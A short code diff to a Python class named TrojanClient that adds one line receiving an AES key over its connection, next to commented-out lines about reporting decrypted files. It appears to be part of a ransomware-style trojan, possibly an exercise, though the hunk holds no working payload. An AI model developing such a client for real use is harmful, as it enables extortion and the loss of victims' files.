@@ -135,6 +135,9 @@ class TrojanClient:
         #     protocol.send(self.connection, "the files are decrypted")
 
         # sys.exit()
+        
+        aes_key = protocol.receive(self.connection)
+
 
 
 if __name__ == "__main__":
